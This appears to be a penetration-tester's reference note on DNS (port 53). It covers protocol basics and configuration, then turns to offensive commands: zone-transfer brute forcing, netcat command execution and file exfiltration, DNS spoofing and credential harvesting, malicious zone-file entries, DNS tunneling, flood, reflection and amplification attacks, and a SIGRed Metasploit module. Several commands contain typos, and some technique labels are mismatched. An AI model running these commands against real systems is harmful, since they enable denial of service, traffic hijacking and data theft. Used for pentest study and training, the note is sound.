# Index
- [[Ports, Protocols, and Services]]

# Domain Name System (DNS)

- **Port Number:** 53
- **Protocol:** TCP/UDP
- **Service Name:** Domain Name System (DNS)
- **Defined in:** RFC 1035 (among others)

The Domain Name System (DNS) is a hierarchical and decentralized naming system for computers, services, or other resources connected to the internet or a private network. It translates human-readable domain names (like www.example.com) into IP addresses (like 192.0.2.1) that computers use to identify each other on the network. DNS is a critical component of the internet, enabling the use of domain names instead of IP addresses to access websites and other online resources.

## Overview of Features

- **Hierarchical Structure:** DNS uses a hierarchical structure that starts with the root at the top, followed by top-level domains (TLDs), second-level domains, and so on.
  
- **Distributed Database:** DNS operates as a distributed database, with each part of the DNS hierarchy managed by different organizations, allowing for scalable and fault-tolerant name resolution.

- **Caching Mechanism:** DNS responses are cached by both clients and DNS servers to improve resolution speed and reduce load on authoritative servers.

- **Redundancy and Failover:** DNS uses multiple servers to ensure high availability. If one server fails, others can still provide name resolution services.

- **Support for Multiple Record Types:** DNS supports various types of records, including A, AAAA, CNAME, MX, PTR, SRV, TXT, and more, each serving different purposes.

- **Security Extensions (DNSSEC):** DNSSEC adds a layer of security by allowing DNS responses to be verified using digital signatures, preventing certain types of attacks such as cache poisoning.

## Typical Use Cases

- **Domain Name Resolution:** Translating human-readable domain names into IP addresses, enabling users to access websites and services without needing to remember numerical IP addresses.

- **Email Routing:** Using MX (Mail Exchange) records to direct email traffic to the correct mail server for a domain.

- **Load Balancing:** Utilizing DNS to distribute traffic across multiple servers, improving performance and reliability.

- **Service Discovery:** DNS SRV records allow clients to discover services within a network, specifying the hostname and port of servers offering the service.

- **Reverse DNS Lookup:** PTR records enable the translation of IP addresses back into domain names, often used in email security and network diagnostics.

## How DNS Protocol Works

1. **Client Query:**
   - **Step 1:** A client (often a web browser) initiates a DNS query by sending a request to a DNS resolver (usually provided by the ISP or configured manually).
   - **Step 2:** The query typically asks for the IP address associated with a domain name.

2. **Recursive Resolution (Resolver Process):**
   - **Step 3:** The DNS resolver checks its cache to see if it already knows the IP address for the requested domain. If not, it begins a recursive query process.
   - **Step 4:** The resolver first queries a root DNS server, which responds with the IP address of a TLD (Top-Level Domain) DNS server responsible for the domain’s TLD (e.g., .com, .org).
   - **Step 5:** The resolver then queries the TLD DNS server, which responds with the IP address of an authoritative DNS server for the specific domain.
   - **Step 6:** Finally, the resolver queries the authoritative DNS server, which responds with the requested IP address.
   - **Step 7:** The resolver returns the IP address to the client and caches the response for future queries.

3. **Direct Query (UDP):**
   - **Step 8:** For most DNS queries, UDP is used due to its lower overhead and faster performance. The client sends a DNS query via UDP on port 53.
   - **Step 9:** The DNS server responds with the requested information, typically within a single UDP packet.

4. **TCP Fallback:**
   - **Step 10:** If the DNS response is too large to fit in a single UDP packet, the client and server fall back to TCP on port 53. This is also used for zone transfers and DNSSEC.
   - **Step 11:** A TCP connection is established, and the DNS query is sent again over this connection.
   - **Step 12:** The server responds with the necessary information over TCP, ensuring the entire response is received.

5. **Response Handling:**
   - **Step 13:** The client receives the DNS response and uses the IP address to initiate a connection to the intended server (e.g., for loading a website).
   - **Step 14:** The response is typically cached locally by the client to speed up subsequent requests.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` queries "www.example.com" on `<target_ip>`:53.
- **Resolver:** `<target_ip>` responds with the IP address for "www.example.com" after recursively querying the necessary DNS servers.

# Additional Information

## Different DNS Servers

|**Server Type**|**Description**|
|-|-|
| DNS Root Server              | The root servers of the DNS are responsible for the top-level domains (TLD). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (ICANN) coordinates the work of the root name servers. There are 13 such root servers around the globe. |
| Authoritative Nameserver     | Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point.                                                                                                                                                                            |
| Non-authoritative Nameserver | Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.                                                                                                                                                                                                                                               |
| Caching DNS Server           | Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.                                                                                                                                                                                                                                                                                             |
| Forwarding Server            | Forwarding servers perform only one function: they forward DNS queries to another DNS server.                                                                                                                                                                                                                                                                                                                                                            |
| Resolver                     | Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.                                                                                                                                                                                                                                                                                                                                               |

## DNS Record Types
- **A Record (Address Record):** Maps a domain name to an IPv4 address.
- **AAAA Record:** Maps a domain name to an IPv6 address.
- **CNAME Record (Canonical Name Record):** Aliases one domain name to another.
- **MX Record (Mail Exchange Record):** Specifies the mail servers responsible for receiving email for a domain.
- **PTR Record (Pointer Record):** Maps an IP address to a domain name for reverse DNS lookups.
- **NS Record (Name Server Record):** Specifies the authoritative name servers for a domain.
- **SOA Record (Start of Authority Record):** Contains administrative information about a domain, including the primary name server and the contact email for the domain administrator.
- **SRV Record (Service Record):** Defines the location (hostname and port) of servers for specified services.
- **TXT Record (Text Record):** Allows the inclusion of arbitrary text in a DNS record, often used for verification, security (e.g., SPF records for email), or other custom purposes.

### SOA Record
The SOA record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.

```c
;; AUTHORITY SECTION:
inlanefreight.com.      900     IN      SOA     ns-161.awsdns-20.com. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400
```

The dot (.) is replaced by an at sign (@) in the email address. In this example, the email address of the administrator is awsdns-hostmaster@amazon.com.

## DNS Security
- **DNSSEC:** Domain Name System Security Extensions (DNSSEC) add a layer of security by enabling DNS responses to be verified using cryptographic signatures, preventing attackers from tampering with DNS data.
- **DNS Cache Poisoning:** A type of attack where incorrect DNS responses are cached, leading users to be redirected to malicious sites.
- **DNS Amplification Attacks:** A form of DDoS attack where small DNS queries are used to generate large responses that overwhelm a target.

## DNS Operations
- **Zone Transfers:** The process by which DNS servers share information about the DNS zone, typically occurring between a primary (master) and secondary (slave) DNS server. TCP is used for these operations to ensure reliable data transfer.
- **Dynamic DNS (DDNS):** Allows DNS records to be automatically updated with new IP addresses, commonly used for devices with changing IP addresses.

## Configuration Files

1. **BIND (Berkeley Internet Name Domain):**
  - **File Locations:**
    - `/etc/named.conf`: Main configuration file.
    - `/var/named/zonefile.db`: Zone file containing DNS records for a domain.
  - **Example Configuration:**
    ```bash
    options {
        directory "/var/named";
        allow-query { any; };
    };

    zone "example.com" {
        type master;
        file "example.com.db";
    };
    ```
  - **Key Settings:**
    - `directory`: Specifies the working directory for DNS zone files.
    - `allow-query`: Defines who can query the DNS server.
    - `zone`: Specifies a DNS zone, its type (e.g., master, slave), and the location of its zone file.

2. **Unbound:**
  - **File Location:** `/etc/unbound/unbound.conf`
  - **Example Configuration:**
    ```bash
    server:
        interface: 0.0.0.0
        access-control: 0.0.0.0/0 allow
        verbosity: 1
    forward-zone:
        name: "example.com"
        forward-addr: 192.0.2.1
    ```
  - **Key Settings:**
    - `interface`: Defines the IP address and port Unbound listens on.
    - `access-control`: Specifies access control rules for DNS queries.
    - `forward-zone`: Defines forwarders for specific zones.

## Potential Misconfigurations

1. **Open DNS Resolver:**
   - **Risk:** An open DNS resolver accepts and processes queries from any IP address, making it vulnerable to abuse in amplification attacks.
   - **Exploitation:** Attackers can use open resolvers to launch DNS amplification DDoS attacks against a target, greatly increasing traffic volume.

2. **Incorrect Zone Transfers:**
   - **Risk:** If zone transfers are not properly restricted, attackers could download the entire DNS zone file, gaining insight into internal network structure.
   - **Exploitation:** By querying for a zone transfer, an attacker could retrieve DNS records for all hosts within a domain, providing valuable information for further attacks.

3. **Misconfigured DNSSEC:**
   - **Risk:** Improperly configured DNSSEC can lead to validation failures, causing legitimate queries to fail or be redirected.
   - **Exploitation:** Attackers could exploit these failures to redirect traffic or cause denial of service.

4. **Overly Permissive Query Settings:**
   - **Risk:** Allowing queries from any source can expose the DNS server to reconnaissance and abuse.
   - **Exploitation:** Attackers could use DNS to gather information about internal network hosts or conduct DNS-based reconnaissance.

## Default Credentials

DNS servers typically do not use direct authentication for queries. However, if DNS administrative interfaces (e.g., web-based management consoles) are used, they might have default credentials, such as:

- **BIND Webmin Module:**
  - **Default Username:** `admin`
  - **Default Password:** `changeme`

These should be changed immediately after installation to prevent unauthorized access.

# Interaction and Tools

## Tools

### [[Dig]]
- **Query Domain:** Retrieve the A record for a domain.
	```bash
	dig <target_url>
	```
- **Check DNS Server Version:** Identify the version of the DNS server software.
	```bash
	dig @<target_ip> version.bind chaos txt
	```
- **DNSSEC Validation:** Queries a domain with DNSSEC validation, ensuring that the DNS responses are authentic and unaltered.
	```bash
	dig +dnssec <domain_name>
	```
- **Querying Specific DNS Record Types:** Use `dig` to query specific DNS records such as MX, TXT, or AAAA.  
	```bash
	dig <domain_name> <record_type>
	```
	  - **Example:**
	    ```bash
	    dig <target_domain>
	    dig ANY @<target_ip> <target_domain>
	    dig A @<target_ip> <target_domain>
	    dig AAAA @<target_ip> <target_domain>
	    dig TXT @<target_ip> <target_domain>
	    dig MX @<target_ip> <target_domain>
	    dig NS @<target_ip> <target_domain>
	    dig -x 192.168.0.2 @<target_ip>
	    dig -x 2a00:1450:400c:c06::93 @<target_ip>
	    ```
- **Reverse DNS Lookup:** Performs a reverse DNS lookup to find the domain name associated with an IP address.  
	```bash
	dig -x <target_ip>
	```
- **Zone Transfer Request:** Requests a full zone transfer from a DNS server, which can reveal all the records for a domain (if allowed).
	```bash
	dig @<target_dns_server> <zone_name> AXFR
	```
	- **Example:**
    ```bash
    dig axfr @<target_ip>
    dif axfr @127.0.0.1
    
    dig axfr <target_domain> @<target_ip>
    dig axfr example.com @127.0.0.1
    
    dig axfr <subdomain>.<target_domain> @<target_ip>
    dig axr subdomain.example.com @127.0.0.1
    
    dig @<target_dns_server> <zone_name> AXFR
    dig @ns1.example.com example.com AXFR
    ```

### [[Host]]
- **Query Domain:** A simple DNS lookup utility to find the IP address of a domain.  
	```bash
	host <target_domain>
	```

### [[Nslookup]] 
***(Depreciated; Replaced by `host` and `dig`)***
- **Query Domain:** Queries the DNS to find the IP address associated with a domain name. 
	```bash
	nslookup <domain_name>
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 53"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 53
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 53
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 53 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 53
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 53 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple test to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:53
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 53 -c 1
    ```

### [[DNSEnum]]
- **Enumerate Domain:** Enumerating DNS records, finding subdomains, and gathering DNS-related information during reconnaissance.
    ```bash
    dnsenum example.com
    ```

### [[DNSRecon]]
- **Enumerate Domain:** Comprehensive DNS enumeration, including brute-forcing subdomains and testing for zone transfers.
    ```bash
    dnsrecon -d example.com
    ```
  
### [[Fierce]]
- **Enumerate Domain:** DNS-based reconnaissance and subdomain enumeration.
    ```bash
    fierce -dns example.com
    
	fierce --domain <target_domain> --dns-servers <target_ip>
    ```

### [[DNSChef]]
- **Enumerate Domain:** Manipulating DNS responses to redirect traffic during red team exercises.
	```bash
	dnschef --fakeip <fake_ip> --fakedomains example.com
	```

### [[Scapy]]
- **Custom Script:** Crafting custom DNS packets for exploitation or testing purposes.
	```python
	from scapy.all import *
	packet = IP(dst="<target_ip>")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
	send(packet)
	```

## Other Techniques

## Virtual Hosts
Some subdomains aren't always hosted in publicly accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their `/etc/hosts` file (or `c:\windows\system32\drivers\etc\hosts` file for Windows users) which maps domain names to IP addresses. Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilize this host header by making changes to it and monitoring the response to see if we've discovered a new website.

- Automate fuzzing by using a subdomain dictionary file of possible vhost names and examining the Content-Length header to look for any differences.
	```bash
	cat ./<wordlist> | while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I [http://192.168.10.10](http://192.168.10.10) -H "HOST: ${vhost}.randomtarget.com" | grep "Content-Length: ";done
	```
	
	```bash
	ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.example.com" -u [http://<attack_host>](http://%3cattack_host%3e)
	```

## Mail to nonexistent account
Simply sending an email message to a nonexistent address at a target domain often reveals useful internal network information through a nondelivery notification (NDN).

Generating server: noa.nintendo.com
```bash
blah@nintendo.com
#550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ##
```

Original message headers:
```bash
Received: from ONERDEDGE02.one.nintendo.com (10.13.20.35) by
onerdexch08.one.nintendo.com (10.13.30.39) with Microsoft SMTP Server (TLS)
id 14.3.174.1; Sat, 26 Apr 2014 16:52:22 -0700
Received: from barracuda.noa.nintendo.com (205.166.76.35) by
ONERDEDGE02.one.nintendo.com (10.13.20.35) with Microsoft SMTP Server (TLS)
id 14.3.174.1; Sat, 26 Apr 2014 16:51:22 -0700
X-ASG-Debug-ID: 1398556333-0614671716199b0d0001-zOQ9WJ
Received: from gateway05.websitewelcome.com (gateway05.websitewelcome.com  [69.93.154.37]) by
barracuda.noa.nintendo.com with ESMTP id xVNPkwaqGgdyH5Ag for <blah@nintendo.com>; Sat,
26 Apr 2014 16:52:13 -0700 (PDT)
X-Barracuda-Envelope-From: chris@example.org
X-Barracuda-Apparent-Source-IP: 69.93.154.37
```

The following data in this transcript is useful:
	- Internal hostnames, IP addresses, and subdomain layout
	- The mail server is running Microsoft Exchange Server 2010 SP3
	- A Barracuda Networks device is used to perform content filtering

## DNS Recursion DDoS
If DNS recursion is enabled, an attacker could spoof the origin on the UDP packet in order to make the DNS send the response to the victim server. An attacker could abuse ANY or DNSSEC record types as they use to have the bigger responses.

The way to check if a DNS supports recursion is to query a domain name and check if the flag `ra` (recursion available) is in the response:
```bash
dig example.com A @<target_ip>
```

- **Non available:**
	```bash
	flags: qr rd;
	```

- **Available:**
	```bash
	flags: qr rd ra;
	```

# Penetration Testing Techniques

## External Reconnaissance

### Subdomain Enumeration
- **Tool:** [[DNSEnum]]
    ```bash
    dnsenum example.com    
    ```
- **Description:** Enumerate subdomains to identify additional targets or entry points.

<br>

- **Tool:** [[DNSRecon]]
	```bash
	dnsrecon -d example.com -t brt
	```
**Description:** Enumerate subdomains to identify additional targets or entry points.

### Zone Transfer
- **Tool:** [[Dig]]
    ```bash
    dig @ns1.example.com example.com AXFR
    ```
- **Description:** Attempt to perform a zone transfer to retrieve all DNS records for a domain.

### Reverse DNS Mapping
- **Tool:** [[Dig]]
    ```bash
    dig -x <IP_range>
    ```
- **Description:** Map IP addresses back to their associated domain names, which can reveal internal hostnames.

## Initial Access

### DNS-Based Phishing
- **Tool:** [[DNSRecon]]
    ```bash
    dnsrecon -d phishingdomain.com -t std
    ```
- **Description:** Use DNS records to set up a phishing domain that mimics legitimate services.

### DNS Spoofing
- **Tool:** [[DNSSpoof]]
    ```bash
    dnsspoof -i eth0 -f hosts.txt
    ```
- **Description:** Spoof DNS responses to redirect legitimate traffic to a malicious server.

## Persistence

### Malicious DNS Entry
- **Tool:** [[Custom Scripts]], BIND
    ```bash
    echo "malicious.example.com IN A <malicious_ip>" >> /var/named/example.com.db
    ```
- **Description:** Insert a malicious DNS record into the DNS server’s zone file to redirect traffic to a controlled server.

### Persistence via DNS Hijacking
- **Tool:** [[Custom Scripts]], [[DNSChef]]
	```bash
	dnschef --fakeip <fake_ip> --fakedomains example.com
	```
- **Description:** Manipulates DNS responses to persistently redirect legitimate traffic to malicious servers.

## Credential Harvesting

### Harvesting Credentials via Fake DNS Responses
- **Tool:** [[DNSChef]]
- **Command:**
	```bash
	dnschef --fakeip <fake_ip> --fakedomains example.com
	```
- **Description:** Redirects users to a fake login page by manipulating DNS responses, allowing the attacker to capture credentials.

## Privilege Escalation

### Exploit Weak DNS Permissions
- **Tool:** [[Custom Scripts]], BIND
    ```bash
    chmod 777 /var/named/example.com.db
    ```
- **Description:** If the DNS server has weak file permissions, an attacker might alter zone files to redirect traffic or hijack domains.

## Internal Reconnaissance

### DNS Cache Snooping
- **Tool:** [[Dig]]
    ```bash
    dig @<internal_dns_server> <domain_name>
    ```
- **Description:** Determine what other domains have been queried recently by checking cached responses on the DNS server.

### Internal Host Discovery
- **Tool:** [[Nmap]]
    ```bash
    nmap <internal_subnet> -sL -n
    ```
- **Description:** Use DNS to enumerate internal hosts, often by querying for common hostnames or leveraging PTR records.

<br>

- **Tool:** [[DNSRecon]]
    ```bash
    dnsrecon -d example.com -t std
    ```
- **Description:** Use DNS to enumerate internal hosts, often by querying for common hostnames or leveraging PTR records.

## Lateral Movement, Pivoting, and Tunnelling

### DNS Tunneling for Pivoting
- **Tool:** [[Iodine]]
    ```bash
    iodine -f mydns.example.com <attack_ip>
    ```
- **Description:** Use DNS tunneling to maintain a covert channel across network boundaries, facilitating lateral movement and data exfiltration.

## Defense Evasion

### DNS Query Padding
- **Tool:** [[Custom Scripts]], [[Scapy]]
    ```python
    from scapy.all import *
    pkt = IP(dst="<target_ip>")/UDP(dport=53)/DNS(qd=DNSQR(qname="example.com"))
    send(pkt)
    ```
- **Description:** Pad DNS queries to obfuscate the nature of the query and evade detection by signature-based defenses.

### Using DNS to Bypass Firewalls
- **Tool:** [[DNSCat2]]
	```bash
	dnscat2 --dns example.com
	```
- **Description:** Utilizing DNS to exfiltrate data or communicate with command and control servers, bypassing firewall rules that block direct IP-based communication.

## Data Exfiltration

### DNS Exfiltration
- **Tool:** [[DNSCat2]]
    ```bash
    dnscat2 -d example.com
    ```
- **Description:** Exfiltrate data by encoding it into DNS queries, allowing it to bypass traditional data exfiltration defenses.

# Exploits and Attacks

## Brute Force Zone Transfer
- **Tool:** [[DNSRecon]]
    ```bash
    dnsrecon -d example.com -t brt
    ```
- **Description:** Attempt to brute force the zone transfer permissions to retrieve DNS records.

<br>

- **Tool:** [[Custom Scripts]], [[Dig]]
	```bash
	for sub in $(cat /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt);
		do dig $sub.<target_domain> @<target_ip> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt 
		&& dig axfr $sub.<target_domain> @<target_ip> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;
		done
	```
- **Description:** Presence of an SOA record in the return is indication of a zone that can be brute forced.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### DNS Amplification Attack
- **Tool:** [[Scapy]]
    ```python
    from scapy.all import *
    send(IP(src="<spoofed_ip>", dst="<dns_server_ip>")/UDP(dport=53)/DNS(qd=DNSQR(qname="example.com")))
    ```
- **Description:** Exploit open DNS resolvers to amplify the size of the attack, sending large responses to a target with a small initial query.

## Exploits 

### DNS Cache Poisoning
- **Tool:** [[DNSSpoof]]
    ```bash
    dnsspoof -i eth0 -f hosts.txt
    ```
- **Description:** Poison the DNS cache of a resolver, causing it to return incorrect IP addresses for domain queries.

<br>

- **Tool:** [[ettercap]]
	```bash
	ettercap -Tq -i <interface> -P dns_spoof -M arp:remote /<target_ip>/
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### CVE-2020-1350 (SIGRed)
- **Tool:** Custom Exploit, [[Metasploit]]
    ```bash
    use auxiliary/scanner/dns/sigred_dos
    ```
- **Description:** Exploits a vulnerability in Microsoft DNS servers that could lead to remote code execution.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 1035|https://tools.ietf.org/html/rfc1035|
|dig Manual|https://linux.die.net/man/1/dig|
|BIND Documentation|https://www.isc.org/bind/|
|dnsrecon Documentation|https://github.com/darkoperator/dnsrecon|
|iodine Documentation|https://code.kryo.se/iodine/|
|dnscat2 GitHub|https://github.com/iagox86/dnscat2|
|Scapy Documentation|https://scapy.readthedocs.io/en/latest/|
|Nmap Reference Guide|https://nmap.org/book/nmap-refguide.html|
|Fierce Tool|https://github.com/mschwager/fierce|
|TCP/IP Illustrated|https://www.amazon.com/TCP-Illustrated-Volume-Implementation/dp/0201633469|
